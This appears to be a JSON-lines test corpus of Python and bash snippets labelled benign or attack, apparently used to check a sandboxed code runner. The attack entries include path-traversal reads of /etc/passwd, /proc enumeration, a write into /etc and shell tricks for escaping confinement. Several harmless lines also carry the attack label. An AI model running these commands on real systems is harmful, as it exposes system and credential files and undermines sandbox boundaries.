+{"lang": "python", "code": "mx=max(int(x) for x in open(\"/work/input/lat.txt\"))\nprint(mx)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "with open(\"/work/input/a.log\") as f, open(\"/work/out/o.txt\",\"w\") as o:\n for l in f:\n  if \"ERR\" in l:o.write(l)", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import difflib\na=open(\"/work/input/a.txt\").readlines()\nb=open(\"/work/input/b.txt\").readlines()\nprint(list(difflib.unified_diff(a,b))[:5])", "kind": "benign", "note": ""}
+{"lang": "python", "code": "print(open(\"/work/input/config.yaml\").read())", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import base64\nprint(base64.b64encode(b\"hi\"))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "print(\"%.2f\"%(3.14159))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import textwrap\nprint(textwrap.fill(\"x\"*100,20))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from collections import Counter\nprint(Counter(open(\"/work/input/a.log\").read().split()).most_common(3))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import re\nips=set(re.findall(r\"\\d+\\.\\d+\\.\\d+\\.\\d+\",open(\"/work/input/a.log\").read()))\nprint(len(ips))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import os.path\nprint(os.path.basename(\"/work/input/app.log\"))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import os\nprint(os.listdir(\"/work/input\"))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "import os.path\nprint(os.path.getsize(\"/work/input/app.log\"))", "kind": "benign", "note": ""}
+{"lang": "python", "code": "data=open(\"/work/input/a.log\").read().splitlines()\nprint(f\"{len(data)} lines\")", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cat /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep ERROR /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -c ERROR /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "tail -n 20 /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "head -n 5 /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "wc -l /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "awk \"{print \\$1}\" /work/input/access.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sort /work/input/a.log | uniq -c", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cut -d: -f1 /work/input/a.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sed \"s/ERROR/ERR/g\" /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -E \"WARN|ERROR\" /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cat /work/input/app.log | grep 500 | wc -l", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "tr \"a-z\" \"A-Z\" < /work/input/a.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "jq \".errors\" /work/input/data.json", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "zcat /work/input/app.log.gz", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "tail -n 100 /work/input/app.log | grep ERROR", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sort -n /work/input/nums.txt | tail -1", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "uniq /work/input/sorted.txt", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "awk \"/ERROR/{c++}END{print c}\" /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -o \"[0-9]*ms\" /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cat /work/input/a.log /work/input/b.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "printf \"done\\n\"", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "echo processing", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "date", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "wc -w /work/input/x.txt", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -i error /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sed -n \"1,10p\" /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "tee /work/out/copy.log < /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sort /work/input/a.log > /work/out/sorted.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep ERROR /work/input/app.log > /work/out/errors.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "tail -f /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "awk -F: \"{print \\$1}\" /work/input/a.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -v DEBUG /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "head -c 100 /work/input/a.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cut -c1-20 /work/input/a.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "sort -u /work/input/ips.txt", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "grep -n ERROR /work/input/app.log", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "cat /dev/null", "kind": "benign", "note": ""}
+{"lang": "bash", "code": "true", "kind": "benign", "note": ""}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").glob(\"../../etc/*\"):\n print(f)", "kind": "attack", "note": "glob enum /etc"}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").glob(\"../../etc/passwd\"):\n print(f.read_text())", "kind": "attack", "note": "glob read (expect deny)"}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/input\").glob(\"../../*\"):\n print(f)", "kind": "attack", "note": "glob enum root"}
+{"lang": "python", "code": "from pathlib import Path\nprint(list(Path(\"/work/input\").glob(\"../../proc/self/*\")))", "kind": "attack", "note": "glob enum proc"}
+{"lang": "python", "code": "from pathlib import Path\nfor f in Path(\"/work/out\").glob(\"../../etc/*\"):\n print(f)", "kind": "attack", "note": "glob from out"}
+{"lang": "python", "code": "import os\nprint(os.listdir(\"/work/input/../..\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(open(\"/work/input/a.log\").read()); import os; print(os.getuid())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "x=getattr; print(x)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print([].__class__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "(lambda: print(open(\"/etc/passwd\").read()))()", "kind": "attack", "note": ""}
+{"lang": "python", "code": "def f():\n return open(\"/etc/passwd\").read()\nprint(f())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "class A:\n x=open(\"/etc/passwd\")\nprint(A.x.read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import io; f=io.StringIO; print(f)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import csv; csv.reader(open(\"/etc/passwd\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import json; json.load(open(\"/etc/passwd\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "with open(\"/work/out/x\",\"w\") as f: f.write(\"a\"*10**7)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import zlib; print(zlib.decompress(b\"x\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import hashlib; hashlib.new(\"md5\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(__name__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "print(__doc__)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import typing; print(typing.Any)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from collections import namedtuple; namedtuple(\"T\",[\"a\"]).__new__.__globals__", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import copy; copy.deepcopy(open)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import dataclasses", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import email.parser; email.parser.Parser().parsestr(open(\"/etc/passwd\").read())", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import html.parser", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import urllib.parse; print(urllib.parse.urlparse(\"file:///etc/passwd\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import urllib.request", "kind": "attack", "note": ""}
+{"lang": "python", "code": "from urllib.request import urlopen", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import base64; print(base64.b64decode(\"aWQ=\"))", "kind": "attack", "note": ""}
+{"lang": "python", "code": "raise SystemExit", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys; sys.exit(0)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys; print(sys.argv)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys; print(sys.stdout)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import sys; sys.stdout.write(\"x\")", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import time; time.sleep(1000)", "kind": "attack", "note": ""}
+{"lang": "python", "code": "import random; print(random.random())", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "grep -R \"\" /etc 2>/dev/null | head", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ls -la /work/input/../..", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "awk \"{print}\" /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sed -n \"p\" /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "head /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "wc /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "sort /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cut -c1 /work/input/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "tee /work/out/../../etc/x < /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/out/../../etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "printf \"%b\" \"\\x2fetc\\x2fpasswd\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo /etc/passwd | xargs cat", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ls /bin | grep -E \"su|mount\"", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "date; cat /etc/hosts", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "test -r /etc/passwd && echo yes", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "[ -f /etc/passwd ] && echo yes", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /proc/1/cmdline", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /proc/self/status", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo hi > /work/out/x; cat /work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "gzip -c /work/input/a.log > /work/out/a.gz", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "zgrep x /work/input/a.log.gz", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "egrep root /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "fgrep root /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "gawk \"{print}\" /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "mawk \"{print}\" /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "nawk \"{print}\" /work/input/a.log", "kind": "attack", "note": ""}
+{"lang": "bash", "code": ":", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "[", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "false", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "true; cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "echo $(</etc/passwd)", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat<>/etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "exec 3</etc/passwd; cat <&3", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "coproc cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "bash -c id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "/bin/busybox cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "env cat /etc/passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "command -v id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "type id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "hash id", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "ulimit -a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "umask", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "pwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cd /etc; cat passwd", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "pushd /etc", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "dirs", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "jobs", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "kill -9 $$", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "wait", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "suspend", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "logout", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "history", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "alias x=id; x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "unalias -a", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "readonly x=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "declare -x x=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "local x=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "typeset x=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "let x=1", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "[[ -f /etc/passwd ]]", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "((0))", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "select x in a; do id; done", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "until false; do id; break; done", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "cat /work/input/a.log | tee /proc/self/mem", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "dd if=/work/input/a.log of=/work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "install /work/input/a.log /work/out/x", "kind": "attack", "note": ""}
+{"lang": "bash", "code": "install /etc/passwd /work/out/x", "kind": "attack", "note": ""}
